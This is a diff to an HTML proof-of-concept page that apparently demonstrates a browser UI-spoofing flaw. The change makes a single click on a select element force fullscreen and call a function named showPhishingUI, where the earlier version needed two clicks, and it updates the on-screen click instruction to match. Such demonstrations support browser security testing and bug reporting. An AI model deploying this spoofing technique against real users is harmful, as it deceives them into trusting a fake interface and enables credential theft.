@@ -92,26 +92,14 @@
 </style>
 
 <script>
-    let clickCount = 0;
+    let clicked = false;
     function spoof() {
-        clickCount++;
-        if (clickCount === 1) {
-            window.requestAnimationFrame(fillSelect);
-            document.documentElement.requestFullscreen();
-            
-            // Listen on the window for the second click to catch clicks outside the select
-            setTimeout(() => {
-                window.addEventListener('mousedown', function secondClick() {
-                    if (clickCount < 2) {
-                        clickCount = 2;
-                        showPhishingUI();
-                        window.removeEventListener('mousedown', secondClick);
-                    }
-                });
-            }, 100);
-        } else if (clickCount >= 2) {
-            showPhishingUI();
-        }
+        if (clicked) return;
+        clicked = true;
+        
+        window.requestAnimationFrame(fillSelect);
+        document.documentElement.requestFullscreen();
+        showPhishingUI();
     }
 
     function showPhishingUI() {
@@ -139,7 +127,7 @@
 </script>
 
 <div id="instruction-text" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); font-family: -apple-system, BlinkMacSystemFont, sans-serif; font-size: 32px; color: #333; z-index: 1000; pointer-events: none;">
-    click 4 times
+    click 1 times
 </div>
 
 <select id="selectElement" onmousedown="spoof()">
